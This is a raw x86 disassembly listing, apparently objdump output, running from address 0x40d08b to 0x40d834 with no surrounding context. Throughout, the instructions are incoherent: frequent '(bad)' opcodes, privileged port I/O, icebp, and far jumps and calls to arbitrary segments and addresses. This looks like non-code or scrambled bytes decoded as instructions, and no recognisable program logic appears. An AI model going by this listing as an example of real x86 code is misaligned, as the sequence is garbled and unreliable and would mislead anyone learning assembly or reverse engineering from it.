  40d08b:	enter  0x78d2,0xe
  40d08f:	popa   
  40d090:	dec    esp
  40d091:	cmp    eax,0xf1067304
  40d096:	(bad)  [ecx]
  40d098:	xlat   BYTE PTR ds:[ebx]
  40d099:	jmp    0x40d0f5
  40d09b:	push   esp
  40d09c:	mov    dl,0x12
  40d09e:	adc    eax,0x37246258
  40d0a3:	ja     0x40d0f2
  40d0a5:	or     ecx,DWORD PTR ds:0x24c2ff66
  40d0ab:	push   edx
  40d0ac:	ins    DWORD PTR es:[edi],dx
  40d0ad:	dec    eax
  40d0ae:	xor    eax,0x743782f7
  40d0b3:	push   ebp
  40d0b4:	cmp    esi,DWORD PTR [edx]
  40d0b6:	xor    al,0xef
  40d0b8:	xor    bl,al
  40d0ba:	jbe    0x40d06f
  40d0bc:	(bad)  
  40d0be:	push   ds
  40d0bf:	xchg   ecx,eax
  40d0c0:	xchg   DWORD PTR [esi+0x15052e30],edx
  40d0c6:	ins    DWORD PTR es:[edi],dx
  40d0c7:	xor    eax,0x32647b8b
  40d0cc:	test   DWORD PTR [ecx-0x2854b986],ebp
  40d0d2:	outs   dx,DWORD PTR ds:[esi]
  40d0d3:	repnz sbb al,0x4a
  40d0d6:	cmp    ah,ch
  40d0d8:	std    
  40d0d9:	mov    esp,0xdbbf4638
  40d0de:	mov    ds:0xb226e3f2,al
  40d0e3:	shl    esp,1
  40d0e5:	inc    eax
  40d0e6:	pop    edi
  40d0e7:	retf   
  40d0e8:	popa   
  40d0e9:	mov    dl,0xb4
  40d0eb:	or     eax,0xaa92023d
  40d0f0:	sahf   
  40d0f1:	and    eax,ebp
  40d0f3:	shl    ch,cl
  40d0f5:	les    edi,FWORD PTR [edx+edx*2+0x5c]
  40d0f9:	mov    ds:0x49963581,eax
  40d0fe:	(bad)  
  40d0ff:	pop    ss
  40d100:	leave  
  40d101:	aaa    
  40d102:	push   cs
  40d103:	in     al,dx
  40d104:	scas   al,BYTE PTR es:[edi]
  40d105:	adc    ah,0xd9
  40d108:	mov    DWORD PTR [ebp+ebx*2+0x122809d6],ecx
  40d10f:	ins    DWORD PTR es:[edi],dx
  40d110:	mov    bh,0x3a
  40d112:	mov    eax,0xeb790bb2
  40d117:	xor    dh,BYTE PTR [eax+0x5c62a982]
  40d11d:	fwait
  40d11e:	and    al,ch
  40d120:	xchg   ebx,eax
  40d121:	loop   0x40d147
  40d123:	jno    0x40d0b8
  40d125:	or     DWORD PTR ss:[ecx],ecx
  40d128:	mov    esp,0xb49b9c1b
  40d12d:	inc    ecx
  40d12e:	dec    eax
  40d12f:	outs   dx,DWORD PTR ds:[esi]
  40d130:	(bad)  
  40d131:	xchg   ecx,eax
  40d132:	or     dl,BYTE PTR [ebx-0x6bfa1198]
  40d138:	nop
  40d139:	cmp    BYTE PTR [edi],0x54
  40d13c:	mov    edx,0x1b87f5f6
  40d141:	push   ss
  40d142:	sub    cl,BYTE PTR [ebx]
  40d144:	pushf  
  40d145:	cmp    eax,0x203577db
  40d14a:	sub    BYTE PTR [eax],ah
  40d14c:	loope  0x40d0f7
  40d14e:	pop    esi
  40d14f:	add    edx,DWORD PTR [ecx+0x632a91f1]
  40d155:	jmp    0xfe3ee9e7
  40d15a:	fild   QWORD PTR [edi]
  40d15c:	into   
  40d15d:	add    DWORD PTR [edi+0x77],0x31401912
  40d164:	push   ebp
  40d165:	ficom  WORD PTR ds:0x7bc117ea
  40d16b:	dec    edx
  40d16c:	add    ebp,DWORD PTR [edi-0x33dd2198]
  40d172:	scas   al,BYTE PTR es:[edi]
  40d173:	sub    DWORD PTR [eax+ebp*1],edx
  40d176:	adc    DWORD PTR [eax-0x4a6b38db],ecx
  40d17c:	jmp    0x8a79:0x98423388
  40d183:	dec    edi
  40d184:	and    al,0x76
  40d186:	jle    0x3508d10c
  40d18c:	daa    
  40d18d:	mov    eax,ds:0xaae5505e
  40d192:	stos   DWORD PTR es:[edi],eax
  40d193:	aam    0xde
  40d195:	test   eax,0x8aaddc03
  40d19a:	add    eax,0xc8754ab7
  40d19f:	push   esp
  40d1a0:	mov    al,ds:0xd02e3754
  40d1a5:	daa    
  40d1a6:	popa   
  40d1a7:	inc    ebx
  40d1a8:	add    eax,0x13
  40d1ab:	add    ah,BYTE PTR [edi]
  40d1ad:	fcmovu st,st(1)
  40d1af:	xchg   edi,eax
  40d1b0:	fisubr WORD PTR [edi]
  40d1b2:	and    esp,DWORD PTR [edx-0x55]
  40d1b5:	push   edx
  40d1b6:	sbb    esp,DWORD PTR [ebx+0x4dd16dce]
  40d1bc:	in     al,0x20
  40d1be:	repz cs jmp 0xa0897b2d
  40d1c5:	jb     0x40d1d4
  40d1c7:	sbb    al,0x42
  40d1c9:	add    cl,BYTE PTR [ebx+edx*8+0x10]
  40d1cd:	je     0x40d1a5
  40d1cf:	inc    edi
  40d1d0:	fsubr  DWORD PTR [ebx+ebx*8]
  40d1d3:	ds mov eax,0xc67da17e
  40d1d9:	cld    
  40d1da:	leave  
  40d1db:	xor    eax,0xb8ebdbf3
  40d1e0:	jnp    0x40d1a4
  40d1e2:	adc    edi,DWORD PTR [esi+0x6b]
  40d1e5:	push   cs
  40d1e6:	test   al,ch
  40d1e8:	in     al,dx
  40d1e9:	shl    BYTE PTR [edi+eiz*1],0x84
  40d1ed:	push   ss
  40d1ee:	cwde   
  40d1ef:	and    BYTE PTR [esi+0x47],dl
  40d1f2:	icebp  
  40d1f3:	mov    ebx,0x61d029b9
  40d1f8:	xor    ecx,ecx
  40d1fa:	icebp  
  40d1fb:	daa    
  40d1fc:	mov    ds:0xa918ee91,eax
  40d201:	jno    0x40d1c5
  40d203:	mov    ds,WORD PTR [eax+ebp*8]
  40d206:	repz (bad) 
  40d208:	push   DWORD PTR [ebx]
  40d20a:	mov    edx,0xbc598166
  40d20f:	mov    edx,0x1ab89713
  40d214:	aas    
  40d215:	ds fwait
  40d217:	push   0x5d250c27
  40d21c:	xchg   edx,eax
  40d21d:	dec    ebx
  40d21e:	add    DWORD PTR [esi],edi
  40d220:	das    
  40d221:	xchg   BYTE PTR [ebp+eiz*1-0x2aa92b9],al
  40d228:	xchg   BYTE PTR [ebx-0x27f0f0d0],dh
  40d22e:	fdivr  DWORD PTR [esi+0x3b0a87fa]
  40d234:	out    0x95,al
  40d236:	mov    edx,0xd8121b15
  40d23b:	adc    DWORD PTR [esp+ebp*1-0xf5cad1c],esi
  40d242:	test   al,dl
  40d244:	pmulhw mm7,mm7
  40d247:	in     eax,dx
  40d248:	addr16 test eax,0x3165541
  40d24e:	aas    
  40d24f:	pop    eax
  40d250:	std    
  40d251:	mov    DWORD PTR [edx+0x7],esp
  40d254:	add    al,0x4
  40d256:	cs fwait
  40d258:	pop    esi
  40d259:	cmp    BYTE PTR [edi-0x7f],0x2b
  40d25d:	(bad)  
  40d25e:	push   esp
  40d25f:	dec    esi
  40d260:	add    eax,0x94925633
  40d265:	aam    0x29
  40d267:	jmp    0x40d1ec
  40d269:	xor    cl,ch
  40d26b:	shl    BYTE PTR [esi-0x4f71ba98],1
  40d271:	icebp  
  40d272:	arpl   WORD PTR [eax],dx
  40d274:	mov    eax,edx
  40d276:	leave  
  40d277:	xor    DWORD PTR [esi],esp
  40d279:	repnz push ecx
  40d27b:	or     BYTE PTR [edi],bh
  40d27d:	sbb    ebx,esp
  40d27f:	and    eax,DWORD PTR [ecx+0x79]
  40d282:	pop    ebp
  40d283:	mov    edx,ebx
  40d285:	jg     0x40d27a
  40d287:	mov    ebx,DWORD PTR [eax+0x45]
  40d28a:	loope  0x40d2b6
  40d28c:	out    0x4f,eax
  40d28e:	pop    ecx
  40d28f:	inc    esi
  40d290:	cli    
  40d291:	or     DWORD PTR [edx+0x6b],edx
  40d294:	add    dh,BYTE PTR ds:0x353af4d7
  40d29a:	cli    
  40d29b:	(bad)  
  40d29c:	jbe    0x40d315
  40d29e:	pop    ebx
  40d29f:	and    al,0xe
  40d2a1:	push   edx
  40d2a2:	ja     0x40d28f
  40d2a4:	cs mov dl,0x37
  40d2a7:	cmp    BYTE PTR [esi],0x67
  40d2aa:	add    DWORD PTR [esi+0x7c],edi
  40d2ad:	mov    es:0x6c96d3f7,eax
  40d2b3:	push   0x352c2a16
  40d2b8:	dec    edx
  40d2b9:	call   0xf6e5f945
  40d2be:	out    dx,eax
  40d2bf:	lods   eax,DWORD PTR ds:[esi]
  40d2c0:	pop    edi
  40d2c1:	cmc    
  40d2c2:	and    BYTE PTR [edx+0x13],0x59
  40d2c6:	call   0x6bb1:0xf09ee270
  40d2cd:	popa   
  40d2ce:	or     eax,0x870fca4f
  40d2d3:	leave  
  40d2d4:	outs   dx,BYTE PTR ds:[esi]
  40d2d5:	push   esp
  40d2d6:	add    ecx,eax
  40d2d8:	jg     0x40d291
  40d2da:	fbld   TBYTE PTR [ebp+0x73b709d5]
  40d2e0:	(bad)  
  40d2e2:	or     eax,0xea9f3cc2
  40d2e7:	popf   
  40d2e8:	fwait
  40d2e9:	pusha  
  40d2ea:	outs   dx,BYTE PTR ds:[esi]
  40d2eb:	scas   al,BYTE PTR es:[edi]
  40d2ec:	sbb    al,0xc8
  40d2ee:	popf   
  40d2ef:	push   esi
  40d2f0:	inc    ebp
  40d2f1:	sar    DWORD PTR [ebp-0x6f52d095],0x3f
  40d2f8:	xchg   ecx,eax
  40d2f9:	push   ecx
  40d2fa:	nop
  40d2fb:	call   FWORD PTR [edi+0x4]
  40d2fe:	pop    esp
  40d2ff:	aaa    
  40d300:	rcr    esi,0xe5
  40d303:	or     eax,0x20309873
  40d308:	adc    eax,0x48e75078
  40d30d:	push   0xffffffec
  40d30f:	pop    ds
  40d310:	dec    ecx
  40d311:	mov    ch,0x32
  40d313:	push   edi
  40d314:	xchg   esi,eax
  40d315:	mov    al,0x5f
  40d317:	mov    edi,0xa14862be
  40d31c:	sbb    BYTE PTR [esi-0x2fcd3e4d],0x1d
  40d323:	mov    esi,DWORD PTR [edi]
  40d325:	add    ebx,ebp
  40d327:	xchg   ecx,eax
  40d328:	jne    0x40d31b
  40d32a:	or     cl,BYTE PTR ds:0xc986ac80
  40d330:	jnp    0x40d3a9
  40d332:	mov    WORD PTR [edi],?
  40d334:	adc    eax,0x8214f8d3
  40d339:	mov    al,0x17
  40d33b:	dec    esi
  40d33c:	mov    ch,0x21
  40d33e:	xchg   esp,eax
  40d33f:	adc    eax,DWORD PTR [esi]
  40d341:	ror    esp,cl
  40d343:	test   BYTE PTR [esi],0x75
  40d346:	push   0x22
  40d348:	jg     0x40d2ef
  40d34a:	lahf   
  40d34b:	add    dl,ch
  40d34d:	push   es
  40d34e:	sahf   
  40d34f:	add    BYTE PTR [esp+eiz*8-0x6002d377],ch
  40d356:	rol    ah,0x4b
  40d359:	scas   eax,DWORD PTR es:[edi]
  40d35a:	fwait
  40d35b:	push   esp
  40d35c:	cdq    
  40d35d:	pop    edx
  40d35e:	push   esi
  40d35f:	mov    eax,ds:0xd380e1d6
  40d364:	mov    ebx,0xab06232f
  40d369:	jbe    0x40d32c
  40d36b:	and    al,0x8c
  40d36d:	test   BYTE PTR [ebp-0x2d],bh
  40d370:	in     al,0xd7
  40d372:	inc    edi
  40d373:	jne    0x40d366
  40d375:	je     0x40d34b
  40d377:	in     eax,dx
  40d378:	dec    esi
  40d379:	mov    eax,DWORD PTR [edi]
  40d37b:	cmp    ebx,DWORD PTR [ecx+0x2e9f8fec]
  40d381:	(bad)  [ebp+0xd]
  40d384:	ror    BYTE PTR [ebx+ebx*8],1
  40d387:	or     DWORD PTR [ecx+0x3713c14b],eax
  40d38d:	and    esi,edx
  40d38f:	push   edi
  40d390:	enter  0x9630,0xb5
  40d394:	and    DWORD PTR [edx+0x69],esi
  40d397:	loopne 0x40d3ac
  40d399:	xor    ebx,DWORD PTR [eax+0x43]
  40d39c:	jmp    0x40d31f
  40d39e:	loopne 0x40d366
  40d3a0:	aas    
  40d3a1:	mov    al,0x15
  40d3a3:	lahf   
  40d3a4:	sbb    BYTE PTR [ebp+0x2b8e22cd],bl
  40d3aa:	dec    edx
  40d3ab:	xor    al,0xfa
  40d3ad:	sahf   
  40d3ae:	out    0x4c,eax
  40d3b0:	inc    edx
  40d3b1:	or     ecx,DWORD PTR ds:[esi+0x48]
  40d3b5:	stos   DWORD PTR es:[edi],eax
  40d3b6:	and    al,0x63
  40d3b8:	add    ch,BYTE PTR [ebx-0x666b770a]
  40d3be:	or     DWORD PTR [edx],ecx
  40d3c0:	jg     0x40d3a4
  40d3c2:	sub    esp,edx
  40d3c4:	bound  esi,QWORD PTR ds:0xfea36a70
  40d3ca:	jmp    0x8456:0xcf30f9a7
  40d3d1:	test   ebp,esp
  40d3d3:	mov    BYTE PTR [edx+ebp*8+0x100e3e83],ch
  40d3da:	adc    eax,0x41408223
  40d3df:	mov    cl,0xc5
  40d3e1:	mov    ebx,0x4f8d88c1
  40d3e6:	pop    edi
  40d3e7:	adc    al,0x0
  40d3e9:	inc    esp
  40d3ea:	sbb    ah,BYTE PTR [esi+0x3768922d]
  40d3f0:	pop    ds
  40d3f1:	std    
  40d3f2:	pop    es
  40d3f3:	mov    edi,0xe455cac
  40d3f8:	(bad)  
  40d3f9:	xchg   ecx,eax
  40d3fa:	lods   al,BYTE PTR ds:[esi]
  40d3fb:	mov    WORD PTR [eax+eiz*2],ss
  40d3fe:	xor    DWORD PTR ds:0x16518978,esi
  40d404:	bound  esp,QWORD PTR [edi+0x69]
  40d407:	ins    BYTE PTR es:[edi],dx
  40d408:	nop
  40d409:	and    al,0xe9
  40d40b:	mov    eax,ds:0x55771066
  40d410:	jnp    0x40d39c
  40d412:	int    0x81
  40d414:	lods   eax,DWORD PTR ds:[esi]
  40d415:	add    BYTE PTR [eax+0xf],0xc6
  40d419:	inc    ebp
  40d41a:	std    
  40d41b:	fdivr  st(1),st
  40d41d:	xor    eax,esi
  40d41f:	adc    DWORD PTR [ecx],eax
  40d421:	mov    ds:0x4c967fe4,eax
  40d426:	xor    al,0x4d
  40d428:	in     eax,dx
  40d429:	or     BYTE PTR ds:0x4c817d51,al
  40d42f:	mov    eax,ds:0x70e3636a
  40d434:	inc    eax
  40d435:	push   cs
  40d436:	pop    esi
  40d437:	jle    0x40d4af
  40d439:	push   edi
  40d43a:	in     al,0xfe
  40d43c:	iret   
  40d43d:	adc    DWORD PTR [eax-0x25],esp
  40d440:	call   ebx
  40d442:	ja     0x40d4bd
  40d444:	int3   
  40d445:	in     eax,0x3b
  40d447:	inc    edx
  40d448:	or     bl,ch
  40d44a:	retf   
  40d44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d44c:	cs pushf 
  40d44e:	outs   dx,BYTE PTR ds:[esi]
  40d44f:	jnp    0x40d45f
  40d451:	mov    ebx,0x1021c09e
  40d456:	fwait
  40d457:	or     ebp,0xffffffea
  40d45a:	xchg   esi,eax
  40d45b:	mov    eax,0xc6dfa3c4
  40d460:	bound  eax,QWORD PTR [ecx+edi*4+0x12d25302]
  40d467:	and    ebx,DWORD PTR [esi+0x453d9209]
  40d46d:	mov    ebx,0x64b1bb9d
  40d472:	pusha  
  40d473:	outs   dx,DWORD PTR ds:[esi]
  40d474:	imul   ebx,DWORD PTR ds:[edi+edi*1+0x1b],0xb3ded14a
  40d47d:	adc    eax,0xd6ddb561
  40d482:	les    edi,FWORD PTR [eax]
  40d484:	mov    bl,0xe3
  40d486:	mov    ebp,DWORD PTR [eax]
  40d488:	int    0xf9
  40d48a:	mov    ecx,0xb63bed4e
  40d48f:	push   ds
  40d490:	xor    ch,0xf6
  40d493:	xor    ebp,DWORD PTR [ebp+0x2a]
  40d496:	mov    edx,DWORD PTR ds:0xe05c81de
  40d49c:	mov    bh,0xae
  40d49e:	mov    dl,0x10
  40d4a0:	shr    DWORD PTR es:[edx+0x11],0x4
  40d4a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4a6:	out    0x7c,eax
  40d4a8:	xchg   ecx,eax
  40d4a9:	sti    
  40d4aa:	stos   DWORD PTR es:[edi],eax
  40d4ab:	xor    eax,0x7e057e6a
  40d4b0:	sbb    edx,DWORD PTR [ebp-0x7acabcf0]
  40d4b6:	ret    0x116
  40d4b9:	je     0x40d4f6
  40d4bb:	das    
  40d4bc:	loopne 0x40d482
  40d4be:	sub    al,0x65
  40d4c0:	lds    edi,FWORD PTR [ebp+0x47396d10]
  40d4c6:	jg     0x40d4e3
  40d4c8:	cli    
  40d4c9:	push   ecx
  40d4ca:	adc    BYTE PTR [ecx+esi*1],ch
  40d4cd:	loope  0x40d506
  40d4cf:	or     eax,0xcab3fbdb
  40d4d4:	gs pop ebp
  40d4d6:	push   0x3a41cece
  40d4db:	repnz mov esi,0x58ff8937
  40d4e1:	mov    ebx,esp
  40d4e3:	inc    eax
  40d4e4:	pop    esi
  40d4e5:	aaa    
  40d4e6:	pop    ebx
  40d4e7:	pop    ebp
  40d4e8:	mov    dh,0x4a
  40d4ea:	sbb    ecx,DWORD PTR [edi+0x689a4a17]
  40d4f0:	xchg   edx,eax
  40d4f1:	jmp    0xdeed:0x3d9b9f15
  40d4f8:	sbb    BYTE PTR [ebp-0x59759d60],ch
  40d4fe:	pop    ebx
  40d4ff:	and    BYTE PTR [ebx+ebp*1],dh
  40d502:	pushf  
  40d503:	or     DWORD PTR [edi+ebp*1-0x3a],ebx
  40d507:	adc    DWORD PTR [ebp+0x307e6b64],0x41fb92b1
  40d511:	jle    0x40d51b
  40d513:	or     ch,BYTE PTR [edi+0x19]
  40d516:	lock xor ecx,DWORD PTR [eax-0x1d]
  40d51a:	jle    0x40d54e
  40d51c:	cmp    al,0xb7
  40d51e:	adc    esi,esp
  40d520:	cmp    ch,al
  40d522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d523:	xor    BYTE PTR [ebx-0x1e775d14],al
  40d529:	ud2    
  40d52b:	fist   DWORD PTR [edi+0x7939d6c7]
  40d531:	sub    BYTE PTR [ebp-0x54],0xc8
  40d535:	sbb    BYTE PTR [edi-0x18],al
  40d538:	outs   dx,DWORD PTR ds:[esi]
  40d539:	sbb    eax,0xbd269228
  40d53e:	jmp    0x40d4e4
  40d540:	mov    esi,0x2d5856ef
  40d545:	in     al,0xae
  40d547:	cmp    ah,BYTE PTR [ebp+0x1c]
  40d54a:	xchg   edi,eax
  40d54b:	cli    
  40d54c:	and    esp,ebx
  40d54e:	add    DWORD PTR [ebx+ebp*8],ecx
  40d551:	sbb    BYTE PTR [edx-0x2b],al
  40d554:	fld    DWORD PTR [ecx+ebx*4-0xe12901c]
  40d55b:	push   ss
  40d55c:	fnstenv [eax+esi*4]
  40d55f:	ret    
  40d560:	mov    ebx,0xd554d7e0
  40d565:	imul   ebx,DWORD PTR [eax+0x5974cb32],0xfb2d4874
  40d56f:	ds sub esi,esp
  40d572:	cmp    DWORD PTR [ecx+0xf],ebp
  40d575:	mov    al,ds:0x89bae39a
  40d57a:	sub    DWORD PTR [ecx+0x248863f],edi
  40d580:	add    edi,DWORD PTR [esp+edi*8+0x54ca67a5]
  40d587:	jb     0x40d55d
  40d589:	mov    WORD PTR [edi],?
  40d58b:	and    DWORD PTR [ecx-0x2d],eax
  40d58e:	cmp    DWORD PTR [edi+eax*1-0x3],eax
  40d592:	cmp    eax,DWORD PTR [eax+0x3ba2b270]
  40d598:	loop   0x40d5f3
  40d59a:	dec    edi
  40d59b:	xor    ah,al
  40d59d:	sbb    eax,0xad66c51
  40d5a2:	ret    0xb1e2
  40d5a5:	sti    
  40d5a6:	inc    esi
  40d5a7:	mov    ah,0xce
  40d5a9:	bound  ebx,QWORD PTR [eax-0x42778f5]
  40d5af:	les    esi,FWORD PTR [ecx+0x33b8733]
  40d5b5:	cld    
  40d5b6:	imul   edi,ecx,0xffffffcc
  40d5b9:	adc    al,BYTE PTR [ebx]
  40d5bb:	ins    BYTE PTR es:[edi],dx
  40d5bc:	aad    0x52
  40d5be:	xor    DWORD PTR [ebx-0x2eabdf79],eax
  40d5c4:	pop    edi
  40d5c5:	leave  
  40d5c6:	pop    es
  40d5c7:	adc    BYTE PTR [edi],bl
  40d5c9:	fcmove st,st(1)
  40d5cb:	test   BYTE PTR [esi-0x10],0xc3
  40d5cf:	xor    DWORD PTR [edx-0x60c32315],ebp
  40d5d5:	adc    esp,DWORD PTR [edi]
  40d5d7:	xchg   esi,eax
  40d5d8:	fldln2 
  40d5da:	hlt    
  40d5db:	inc    esi
  40d5dc:	mov    edi,0x63152c4b
  40d5e1:	call   0xe8c75f69
  40d5e6:	push   ebx
  40d5e7:	pop    esi
  40d5e8:	call   0xc051b111
  40d5ed:	or     ch,al
  40d5ef:	aam    0xc3
  40d5f1:	lds    ebp,FWORD PTR [ebx-0x2604e5d5]
  40d5f7:	out    0x51,eax
  40d5f9:	(bad)  
  40d5fa:	loope  0x40d60a
  40d5fc:	fcomp  QWORD PTR [ebp+0x49]
  40d5ff:	inc    esp
  40d600:	gs jmp 0xbd82:0xc2880737
  40d608:	into   
  40d609:	in     eax,dx
  40d60a:	lods   al,BYTE PTR ds:[esi]
  40d60b:	or     ah,BYTE PTR [edx]
  40d60d:	cld    
  40d60e:	mov    edi,DWORD PTR [ecx]
  40d610:	or     al,0xa3
  40d612:	retf   0x5d7
  40d615:	mov    dh,0xff
  40d617:	shr    BYTE PTR [ebp-0x6cb6ed7],1
  40d61d:	arpl   WORD PTR [ecx-0x1c1dd3af],cx
  40d623:	rcl    BYTE PTR [edi-0x34],0xd1
  40d627:	dec    esi
  40d628:	dec    edi
  40d629:	loope  0x40d656
  40d62b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d62c:	xchg   edx,eax
  40d62d:	inc    ebx
  40d62e:	aas    
  40d62f:	and    DWORD PTR [ecx+0x4f],0x3f6de3de
  40d636:	sahf   
  40d637:	data16 fimul WORD PTR [edi]
  40d63a:	addr16 and dh,0xf1
  40d63e:	test   al,0x42
  40d640:	and    BYTE PTR [esi],0x42
  40d643:	push   DWORD PTR [edi-0x5c874966]
  40d649:	or     al,0xa4
  40d64b:	scas   eax,DWORD PTR es:[edi]
  40d64c:	mov    ds,ebp
  40d64e:	cmp    esp,DWORD PTR [ecx]
  40d650:	adc    BYTE PTR [eax+0x2aea07ed],0xf1
  40d657:	fwait
  40d658:	and    eax,0x43ad422f
  40d65d:	(bad)  [ebx]
  40d65f:	daa    
  40d660:	xchg   esp,eax
  40d661:	or     edx,ecx
  40d663:	xchg   esi,eax
  40d664:	cmp    DWORD PTR [ecx],edi
  40d666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d667:	mov    ecx,0x5265f199
  40d66c:	test   BYTE PTR [edx+eax*8-0x4f],bh
  40d670:	xlat   BYTE PTR ds:[ebx]
  40d671:	jmp    0xb96f4a8f
  40d676:	out    0xce,al
  40d678:	xchg   ebx,eax
  40d679:	sbb    BYTE PTR [ebp-0x2d],dh
  40d67c:	sub    DWORD PTR ds:0xd2a784f4,0x63bcd5bb
  40d686:	push   edi
  40d687:	out    dx,eax
  40d688:	push   edx
  40d689:	push   0x7e
  40d68b:	add    al,0xa1
  40d68d:	jbe    0xc88c682c
  40d693:	(bad)  
  40d694:	stos   DWORD PTR es:[edi],eax
  40d695:	sub    DWORD PTR [ecx+edi*1-0x4ee34ca7],ebp
  40d69c:	jns    0x40d719
  40d69e:	call   0xc9a6d73c
  40d6a3:	bnd jbe 0x40d665
  40d6a6:	dec    eax
  40d6a7:	push   edx
  40d6a8:	mov    al,0x3a
  40d6aa:	sbb    eax,0x1478d0ac
  40d6af:	jmp    FWORD PTR [ebx+0x6f]
  40d6b2:	lahf   
  40d6b3:	sbb    eax,esp
  40d6b5:	cmp    bl,BYTE PTR [eax+edx*1-0x766427af]
  40d6bc:	jne    0x40d707
  40d6be:	imul   BYTE PTR [edi-0x6c]
  40d6c1:	and    ecx,DWORD PTR [edi]
  40d6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6c4:	sti    
  40d6c5:	xchg   ebx,eax
  40d6c6:	or     ecx,DWORD PTR [eax]
  40d6c8:	es (bad) 
  40d6ca:	xchg   ebx,eax
  40d6cb:	fild   QWORD PTR fs:[ecx-0x46]
  40d6cf:	adc    esp,esi
  40d6d1:	pop    ebp
  40d6d2:	sbb    eax,0x4e0f48c0
  40d6d7:	(bad)  [eax-0x4c]
  40d6da:	popf   
  40d6db:	dec    ecx
  40d6dc:	iret   
  40d6dd:	fiadd  DWORD PTR [eax]
  40d6df:	clc    
  40d6e0:	inc    edx
  40d6e1:	push   edi
  40d6e2:	mov    ebp,0xf3540536
  40d6e7:	and    al,0x8
  40d6e9:	hlt    
  40d6ea:	push   ds
  40d6eb:	pop    ss
  40d6ec:	xchg   edx,eax
  40d6ed:	leave  
  40d6ee:	rol    BYTE PTR [esi-0x20],0x6e
  40d6f2:	sub    DWORD PTR [ebp+0x4],esp
  40d6f5:	add    BYTE PTR [edi-0x3],dl
  40d6f8:	lds    ebx,FWORD PTR [eax+0x1808e5a9]
  40d6fe:	lock (bad) 
  40d700:	cmp    ecx,DWORD PTR [edi+0x7a6da81b]
  40d706:	(bad)  
  40d708:	shl    DWORD PTR [ecx-0x68],1
  40d70b:	mov    ecx,0xf6f7d65f
  40d710:	mov    dh,0x60
  40d712:	pop    ss
  40d713:	nop
  40d714:	in     eax,dx
  40d715:	int3   
  40d716:	(bad)  
  40d717:	mov    eax,0x19e05c17
  40d71c:	nop
  40d71d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d71e:	outs   dx,DWORD PTR ds:[esi]
  40d71f:	sbb    dh,cl
  40d721:	hlt    
  40d722:	pop    edx
  40d723:	test   DWORD PTR [edi-0x1f1a76a8],esi
  40d729:	ja     0x40d78d
  40d72b:	pop    ds
  40d72c:	lahf   
  40d72d:	ret    
  40d72e:	int3   
  40d72f:	add    al,0x21
  40d731:	idiv   DWORD PTR [edx-0x39]
  40d734:	lods   al,BYTE PTR ds:[esi]
  40d735:	add    ah,BYTE PTR [ecx+0x62]
  40d738:	pushf  
  40d739:	retf   0x8281
  40d73c:	enter  0x191e,0xe5
  40d740:	jno    0x40d6f8
  40d742:	mov    esi,DWORD PTR [ebx]
  40d744:	xor    BYTE PTR [eax+ebp*1-0x4],al
  40d748:	push   ss
  40d749:	jb     0x40d75d
  40d74b:	shr    DWORD PTR [ebx+edx*2-0x6304406f],cl
  40d752:	repz or DWORD PTR [ebx],ecx
  40d755:	sar    DWORD PTR [ebp+eax*8-0x1e],1
  40d759:	clc    
  40d75a:	retf   
  40d75b:	(bad)  
  40d75c:	arpl   WORD PTR [ebp-0xeddf19d],si
  40d762:	fist   DWORD PTR [ebx+0x50]
  40d765:	ins    DWORD PTR es:[edi],dx
  40d766:	mov    edi,0xac142b1e
  40d76b:	arpl   WORD PTR [eax+0x8],bp
  40d76e:	and    ebp,DWORD PTR [ebx+edi*8+0xd3b259e]
  40d775:	test   DWORD PTR [ecx+0x6063299a],ebx
  40d77b:	cmp    esi,edx
  40d77d:	lds    edi,FWORD PTR [edi-0x4027257]
  40d783:	inc    ecx
  40d784:	fisubr WORD PTR [eax]
  40d786:	inc    esp
  40d787:	loop   0x40d73c
  40d789:	stc    
  40d78a:	xor    al,BYTE PTR [edi-0x6e]
  40d78d:	jmp    0x286b:0x6b5cbd7d
  40d794:	hlt    
  40d795:	xchg   ebp,eax
  40d796:	mov    WORD PTR [eax],ds
  40d798:	es leave 
  40d79a:	out    dx,eax
  40d79b:	(bad)  
  40d79c:	in     al,dx
  40d79d:	stos   DWORD PTR es:[edi],eax
  40d79e:	mov    eax,0xb0bab96c
  40d7a3:	pop    esi
  40d7a4:	hlt    
  40d7a5:	lea    ebp,ss:[ebx+ecx*2-0x2503bc9f]
  40d7ad:	rcl    BYTE PTR [esp+ecx*1+0x62056bf2],1
  40d7b4:	dec    esp
  40d7b5:	scas   al,BYTE PTR es:[edi]
  40d7b6:	aad    0x6e
  40d7b8:	adc    al,0x37
  40d7ba:	add    DWORD PTR [eax],ecx
  40d7bc:	mov    ds:0x11ef6c7,eax
  40d7c1:	and    ebp,DWORD PTR [ebx+0x4fbedbfe]
  40d7c7:	sti    
  40d7c8:	imul   edi,DWORD PTR [ecx],0x55
  40d7cb:	jo     0x40d794
  40d7cd:	mov    ecx,0x76c2f3e2
  40d7d2:	mov    ebx,0xc9382275
  40d7d7:	mov    edi,0x92d9f667
  40d7dc:	add    DWORD PTR [ebp-0x58],0xffffffaf
  40d7e0:	xor    eax,0x15751288
  40d7e5:	stc    
  40d7e6:	cwde   
  40d7e7:	mov    bh,0x77
  40d7e9:	mov    ecx,0xf15c13de
  40d7ee:	mov    ds:0xc7650f05,eax
  40d7f3:	sub    al,0x1b
  40d7f5:	or     ah,BYTE PTR [ecx+0x1c284432]
  40d7fb:	xchg   ebx,eax
  40d7fc:	in     eax,dx
  40d7fd:	inc    ebx
  40d7fe:	mov    ch,0x39
  40d800:	mov    ch,0x35
  40d802:	dec    ebp
  40d803:	fwait
  40d804:	lock mov ds:0xc7116fa2,al
  40d80a:	xor    BYTE PTR [esi-0x5c],ah
  40d80d:	lahf   
  40d80e:	push   edi
  40d80f:	jg     0x40d83e
  40d811:	inc    esi
  40d812:	inc    ebx
  40d813:	xor    DWORD PTR [edi+edx*4+0x5e],edi
  40d817:	xchg   ecx,eax
  40d818:	xor    ah,BYTE PTR [ebp+0x72]
  40d81b:	fldenv [eax-0x18c7c7bb]
  40d821:	mov    edx,0xbe48078a
  40d826:	scas   eax,DWORD PTR es:[edi]
  40d827:	mov    dl,0x4b
  40d829:	loop   0x40d85c
  40d82b:	test   al,0xcd
  40d82d:	and    eax,DWORD PTR [eax+eax*8+0x1c4bcce8]
  40d834:	(bad)  
